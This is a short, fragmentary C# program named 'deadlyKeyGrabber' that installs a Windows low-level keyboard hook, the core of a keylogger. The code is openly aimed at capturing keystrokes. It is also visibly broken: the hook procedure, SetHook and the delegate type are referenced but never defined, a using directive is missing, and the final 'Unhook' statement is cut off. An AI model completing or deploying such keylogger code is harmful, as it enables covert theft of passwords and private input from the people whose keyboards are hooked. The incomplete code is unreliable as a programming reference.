using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace deadlyKeyGrabber
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WH_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            Unhook
        }
    }
}
